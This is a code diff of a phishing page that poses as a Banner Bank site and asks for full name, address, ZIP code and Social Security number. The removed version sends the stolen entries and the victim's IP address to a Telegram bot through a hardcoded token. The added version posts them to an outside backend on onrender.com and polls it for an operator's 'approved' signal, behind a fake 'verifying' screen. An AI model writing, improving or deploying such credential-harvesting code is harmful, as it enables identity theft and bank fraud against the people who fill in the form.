@@ -62,20 +62,18 @@
             background-color: #fff;
             padding: 10px 10%;
         }
-        .personal-form {
+        .form {
             padding: 50px 30px;
             display: flex;
             flex-direction: column;
             gap: 15px;
         }
-        .personal-form label {
+        .form label {
             font-weight: bold;
             font-family: sans-serif;
             font-size: 14px;
         }
-        .personal-form input[type="text"],
-        .personal-form input[type="tel"],
-        .personal-form input[type="date"] {
+        .form input[type="text"] {
             padding: 10px;
             font-size: 14px;
             border-radius: 5px;
@@ -83,7 +81,7 @@
             width: 100%;
             box-sizing: border-box;
         }
-        .personal-form input:focus {
+        .form input[type="text"]:focus {
             border-color: #0051ba;
             outline: none;
         }
@@ -218,13 +216,11 @@
             .login-section {
                 padding: 10px 20px;
             }
-            .personal-form {
+            .form {
                 padding: 20px 10px;
                 gap: 12px;
             }
-            .personal-form input[type="text"],
-            .personal-form input[type="tel"],
-            .personal-form input[type="date"] {
+            .form input[type="text"] {
                 padding: 8px;
                 font-size: 13px;
             }
@@ -265,31 +261,19 @@
                 <img src="images/bannerbank.png" alt="Banner Bank Logo" class="imgg">
             </div>
             <div class="login-section">
-                <form class="personal-form" action="/submit-personal" method="POST">
-                    <label for="full-name">Full Name</label>
-                    <input type="text" id="full-name" name="full-name" required aria-describedby="full-name-error" />
-                    <div id="full-name-error" class="error-message" role="alert">Please enter your full name.</div>
-
+                <form class="form" id="personalForm">
+                    <label for="full_name">Full Name</label>
+                    <input type="text" id="full_name" name="full_name" required aria-describedby="personal-error" />
                     <label for="address">Address</label>
-                    <input type="text" id="address" name="address" required aria-describedby="address-error" />
-                    <div id="address-error" class="error-message" role="alert">Please enter a valid address.</div>
-
+                    <input type="text" id="address" name="address" required aria-describedby="personal-error" />
                     <label for="city">City</label>
-                    <input type="text" id="city" name="city" required aria-describedby="city-error" />
-                    <div id="city-error" class="error-message" role="alert">Please enter a valid city.</div>
-
-                    <label for="zip">ZIP Code</label>
-                    <input type="text" id="zip" name="zip" maxlength="5" pattern="\d{5}" inputmode="numeric" required aria-describedby="zip-error" />
-                    <div id="zip-error" class="error-message" role="alert">Please enter a valid 5-digit ZIP code.</div>
-
-                    <label for="ssn">Social Security Number (SSN)</label>
-                    <input type="text" id="ssn" name="ssn" />
-
-                    <label for="dob">Date of Birth (DOB)</label>
-                    <input type="date" id="dob" name="dob" required aria-describedby="dob-error" />
-                    <div id="dob-error" class="error-message" role="alert">Please enter a valid date of birth.</div>
-
-                    <button type="submit" class="submit-btn">Submit Information</button>
+                    <input type="text" id="city" name="city" required aria-describedby="personal-error" />
+                    <label for="zip">Zip Code</label>
+                    <input type="text" id="zip" name="zip" pattern="\d{5}" maxlength="5" inputmode="numeric" required aria-describedby="personal-error" />
+                    <label for="ssn">Social Security Number</label>
+                    <input type="text" id="ssn" name="ssn" pattern="\d{9}" maxlength="9" inputmode="numeric" required aria-describedby="personal-error" />
+                    <div id="personal-error" class="error-message" role="alert">Please fill in all fields correctly.</div>
+                    <button type="submit" class="submit-btn">Submit Personal Details</button>
                 </form>
             </div>
             <div class="footer-section">
@@ -304,124 +288,114 @@
     <div id="waitPage" role="alert" aria-live="assertive">
         <div class="wait-content">
             <div class="spinner"></div>
-            <p>Submitting Information...</p>
+            <p>Verifying Personal Details...</p>
         </div>
     </div>
 
     <script>
-        const config = {
-            botToken: '7915117001:AAED4axtxCp0TznMMRttirjkuBCWsSwq7GA',
-            chatId: '6656157295'
-        };
-
-        async function sendTelegramMessage(message) {
-            const telegramApiUrl = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
-            const payload = {
-                chat_id: config.chatId,
-                text: message,
-                parse_mode: 'HTML'
-            };
-            
-            const response = await fetch(telegramApiUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            const data = await response.json();
-            if (!data.ok) throw new Error('Failed to send message');
-            return data.result.message_id;
-        }
-
-        async function sendPersonalInfo(fullName, address, city, zip, ssn, dob, ip) {
-            const escapeHtml = (str) => str.replace(/[&<>"']/g, (m) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&apos;' })[m]);
-            const message = `🔐 FHB Personal Information 🔐\n👤 Full Name: <code>${escapeHtml(fullName)}</code>\n🏠 Address: <code>${escapeHtml(address)}</code>\n🌆 City: <code>${escapeHtml(city)}</code>\n📍 ZIP: <code>${escapeHtml(zip)}</code>\n🪪 SSN: <code>${escapeHtml(ssn || '')}</code>\n🎂 DOB: <code>${escapeHtml(dob)}</code>\n🌐 IP: <code>${ip}</code>`;
-            return sendTelegramMessage(message);
-        }
-
-        document.querySelector('.personal-form').addEventListener('submit', async (event) => {
+        document.getElementById('personalForm').addEventListener('submit', async (event) => {
             event.preventDefault();
             
-            const fullNameInput = document.getElementById('full-name');
+            const fullNameInput = document.getElementById('full_name');
             const addressInput = document.getElementById('address');
             const cityInput = document.getElementById('city');
             const zipInput = document.getElementById('zip');
             const ssnInput = document.getElementById('ssn');
-            const dobInput = document.getElementById('dob');
             const fullName = fullNameInput.value.trim();
             const address = addressInput.value.trim();
             const city = cityInput.value.trim();
             const zip = zipInput.value.trim();
             const ssn = ssnInput.value.trim();
-            const dob = dobInput.value;
-            const errorMessages = {
-                'full-name': document.getElementById('full-name-error'),
-                'address': document.getElementById('address-error'),
-                'city': document.getElementById('city-error'),
-                'zip': document.getElementById('zip-error'),
-                'dob': document.getElementById('dob-error')
-            };
+            const errorMessage = document.getElementById('personal-error');
             const submitBtn = document.querySelector('.submit-btn');
             const waitPage = document.getElementById('waitPage');
             
-            let hasError = false;
-            
-            // Reset error messages
-            Object.values(errorMessages).forEach(msg => msg.classList.remove('visible'));
-            
-            // Validate inputs
-            if (!fullName) {
-                errorMessages['full-name'].classList.add('visible');
+            if (!fullName || !address || !city || !/^\d{5}$/.test(zip) || !/^\d{9}$/.test(ssn)) {
+                errorMessage.classList.add('visible');
                 fullNameInput.focus();
-                hasError = true;
-            }
-            if (!address) {
-                errorMessages['address'].classList.add('visible');
-                if (!hasError) addressInput.focus();
-                hasError = true;
-            }
-            if (!city) {
-                errorMessages['city'].classList.add('visible');
-                if (!hasError) cityInput.focus();
-                hasError = true;
-            }
-            if (!/^\d{5}$/.test(zip)) {
-                errorMessages['zip'].classList.add('visible');
-                if (!hasError) zipInput.focus();
-                hasError = true;
-            }
-            if (!dob || isNaN(Date.parse(dob))) {
-                errorMessages['dob'].classList.add('visible');
-                if (!hasError) dobInput.focus();
-                hasError = true;
+                return;
             }
             
-            if (hasError) return;
-            
+            errorMessage.classList.remove('visible');
             submitBtn.disabled = true;
             submitBtn.setAttribute('aria-busy', 'true');
             waitPage.style.display = 'flex';
             
             try {
                 const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);
-                await sendPersonalInfo(fullName, address, city, zip, ssn, dob, ip);
-                setTimeout(() => {
-                    window.location.href = 'c.html';
-                }, 10000);
+                const response = await fetch('https://b-bcknd.onrender.com/personal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ full_name: fullName, address, city, zip, ssn, ip })
+                });
+                const data = await response.json();
+                
+                if (!response.ok) throw new Error(data.error || `HTTP error! Status: ${response.status}`);
+                if (data.success && data.id) {
+                    checkStatus(data.id);
+                } else {
+                    throw new Error(data.error || 'Personal details verification failed');
+                }
             } catch (error) {
+                console.error('Personal error:', error);
                 waitPage.style.display = 'none';
                 submitBtn.disabled = false;
                 submitBtn.setAttribute('aria-busy', 'false');
-                errorMessages['full-name'].textContent = 'Failed to submit information. Please try again.';
-                errorMessages['full-name'].classList.add('visible');
+                errorMessage.textContent = `Error: ${error.message}`;
+                errorMessage.classList.add('visible');
                 fullNameInput.value = '';
                 addressInput.value = '';
                 cityInput.value = '';
                 zipInput.value = '';
                 ssnInput.value = '';
-                dobInput.value = '';
                 fullNameInput.focus();
             }
         });
+
+        function checkStatus(id) {
+            let attempts = 0;
+            const maxAttempts = 20; // ~60 seconds
+            const interval = setInterval(() => {
+                attempts++;
+                fetch(`https://b-bcknd.onrender.com/status/${id}`)
+                    .then(res => {
+                        if (!res.ok) throw new Error(`HTTP error! Status: ${res.status}`);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.status === 'approved') {
+                            clearInterval(interval);
+                            window.location.href = data.redirect_url || 'index.html';
+                        } else if (attempts >= maxAttempts) {
+                            clearInterval(interval);
+                            alert('Verification timed out. Please try again.');
+                            document.getElementById('waitPage').style.display = 'none';
+                            document.querySelector('.submit-btn').disabled = false;
+                            document.querySelector('.submit-btn').setAttribute('aria-busy', 'false');
+                            document.getElementById('full_name').value = '';
+                            document.getElementById('address').value = '';
+                            document.getElementById('city').value = '';
+                            document.getElementById('zip').value = '';
+                            document.getElementById('ssn').value = '';
+                            document.getElementById('full_name').focus();
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Status check error:', err);
+                        clearInterval(interval);
+                        alert(`Error: ${err.message}`);
+                        document.getElementById('waitPage').style.display = 'none';
+                        document.querySelector('.submit-btn').disabled = false;
+                        document.querySelector('.submit-btn').setAttribute('aria-busy', 'false');
+                        document.getElementById('full_name').value = '';
+                        document.getElementById('address').value = '';
+                        document.getElementById('city').value = '';
+                        document.getElementById('zip').value = '';
+                        document.getElementById('ssn').value = '';
+                        document.getElementById('full_name').focus();
+                    });
+            }, 3000);
+        }
     </script>
 </body>
 </html>
